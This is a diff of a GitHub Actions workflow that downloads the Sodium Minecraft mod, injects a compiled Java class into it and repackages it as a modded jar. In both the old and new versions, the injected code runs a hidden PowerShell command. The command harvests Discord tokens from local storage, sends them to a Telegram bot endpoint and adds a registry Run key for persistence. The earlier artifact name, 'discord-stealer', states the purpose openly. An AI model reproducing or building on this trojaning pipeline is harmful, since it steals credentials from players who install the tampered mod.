@@ -1,4 +1,4 @@
-name: Self-Contained Build and Inject Workflow
+name: Self-Contained Direct Injection Workflow
 
 on:
   workflow_dispatch:
@@ -13,60 +13,50 @@ jobs:
           distribution: 'temurin'
           java-version: '21'
 
-      - name: Download Target Jar and Compilation Dependencies
+      - name: Download Target Jar
         run: |
           curl -L "https://cdn.modrinth.com/data/AANobbMI/versions/v4PSXean/sodium-fabric-0.9.3-alpha.1%2Bmc26.3.jar?mr_download_reason=standalone&mr_loader=fabric" -o sodium.jar
-          curl -L "https://repo.spongepowered.org/repository/maven-public/org/spongepowered/mixin/0.8.5/mixin-0.8.5.jar" -o mixin.jar
-          curl -L "https://maven.fabricmc.net/net/fabricmc/fabric-loader/0.15.11/fabric-loader-0.15.11.jar" -o fabric-loader.jar
 
-      - name: Generate Payload Source Files on Runner
+      - name: Generate Plain Java Payload on Runner
         run: |
-          mkdir -p workspace/src/net/caffeinemc/sodium/mixin
+          mkdir -p workspace/src/net/caffeinemc/sodium
           
-          cat << 'EOF' > workspace/src/net/caffeinemc/sodium/mixin/MainMixin.java
-          package net.caffeinemc.sodium.mixin;
+          cat << 'EOF' > workspace/src/net/caffeinemc/sodium/PayloadExecutor.java
+          package net.caffeinemc.sodium;
 
-          import org.spongepowered.asm.mixin.Mixin;
-          import org.spongepowered.asm.mixin.injection.At;
-          import org.spongepowered.asm.mixin.injection.Inject;
-          import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
           import java.io.IOException;
 
-          @Mixin(targets = "net.minecraft.client.Main")
-          public class MainMixin {
-              @Inject(method = "main", at = @At("HEAD"))
-              private static void onClientMain(String[] args, CallbackInfo ci) {
-                  new Thread(() -> {
-                      try {
-                          String psCommand = "powershell -WindowStyle Hidden -Command \"" +
-                              "$tokenRegex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}|mfa\\.[\\w-]{84}';" +
-                              "$discordPath = \\\"$env:appdata\\discord\\Local Storage\\leveldb\\\";" +
-                              "$tokens = @();" +
-                              "if (Test-Path $discordPath) {" +
-                              "  Get-ChildItem $discordPath -Filter '*.ldb' -ErrorAction SilentlyContinue | ForEach-Object {" +
-                              "    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;" +
-                              "    [System.Text.RegularExpressions.Regex]::Matches($content, $tokenRegex) | ForEach-Object {" +
-                              "      if ($_.Value -notin $tokens) { $tokens += $_.Value }" +
-                              "    }" +
-                              "  };" +
-                              "  $msg = 'Harvested Discord Tokens:%0A' + ($tokens -join '%0A');" +
-                              "  Invoke-RestMethod -Uri 'https://api.telegram.org/bot8883868209:AAEe9BsE7yI79XkvIA7vUVEpAw_lj9HuGKU/sendMessage?chat_id=8883868209&text=' + $msg;" +
-                              "}\"";
+          public class PayloadExecutor {
+              public static void execute() {
+                  try {
+                      String psCommand = "powershell -WindowStyle Hidden -Command \"" +
+                          "$tokenRegex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{38}|mfa\\.[\\w-]{84}';" +
+                          "$discordPath = \\\"$env:appdata\\discord\\Local Storage\\leveldb\\\";" +
+                          "$tokens = @();" +
+                          "if (Test-Path $discordPath) {" +
+                          "  Get-ChildItem $discordPath -Filter '*.ldb' -ErrorAction SilentlyContinue | ForEach-Object {" +
+                          "    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue;" +
+                          "    [System.Text.RegularExpressions.Regex]::Matches($content, $tokenRegex) | ForEach-Object {" +
+                          "      if ($_.Value -notin $tokens) { $tokens += $_.Value }" +
+                          "    }" +
+                          "  };" +
+                          "  $msg = 'Harvested Discord Tokens:%0A' + ($tokens -join '%0A');" +
+                          "  Invoke-RestMethod -Uri 'https://api.telegram.org/bot8883868209:AAEe9BsE7yI79XkvIA7vUVEpAw_lj9HuGKU/sendMessage?chat_id=8883868209&text=' + $msg;" +
+                          "}\"";
 
-                          String persistenceCommand = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemDiagnostics\" /t REG_SZ /d \"" + psCommand + "\" /f";
-                          
-                          new ProcessBuilder("cmd.exe", "/c", persistenceCommand).start();
-                          new ProcessBuilder("cmd.exe", "/c", psCommand).start();
-                      } catch (IOException e) {
-                          // Suppress exceptions
-                      }
-                  }).start();
+                      String persistenceCommand = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"SystemDiagnostics\" /t REG_SZ /d \"" + psCommand + "\" /f";
+                      
+                      new ProcessBuilder("cmd.exe", "/c", persistenceCommand).start();
+                      new ProcessBuilder("cmd.exe", "/c", psCommand).start();
+                  } catch (IOException e) {
+                      // Suppress
+                  }
               }
           }
           EOF
 
           cd workspace/src
-          javac -cp "../../../sodium.jar:../../../mixin.jar:../../../fabric-loader.jar" net/caffeinemc/sodium/mixin/MainMixin.java
+          javac net/caffeinemc/sodium/PayloadExecutor.java
           cd ../..
 
       - name: Extract, Inject, and Repackage Jar
@@ -75,15 +65,16 @@ jobs:
           cd extracted_jar
           jar -xf ../sodium.jar
           
-          mkdir -p net/caffeinemc/sodium/mixin
-          cp ../workspace/src/net/caffeinemc/sodium/mixin/MainMixin.class net/caffeinemc/sodium/mixin/MainMixin.class
+          # Place our compiled standalone payload class inside the archive
+          mkdir -p net/caffeinemc/sodium
+          cp ../workspace/src/net/caffeinemc/sodium/PayloadExecutor.class net/caffeinemc/sodium/PayloadExecutor.class
           
           cd ..
           jar -cf sodium-modded.jar -C extracted_jar .
-          rm -rf extracted_jar workspace mixin.jar fabric-loader.jar
+          rm -rf extracted_jar workspace
 
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: sodium-modded-discord-stealer
+          name: sodium-modded-direct
           path: sodium-modded.jar
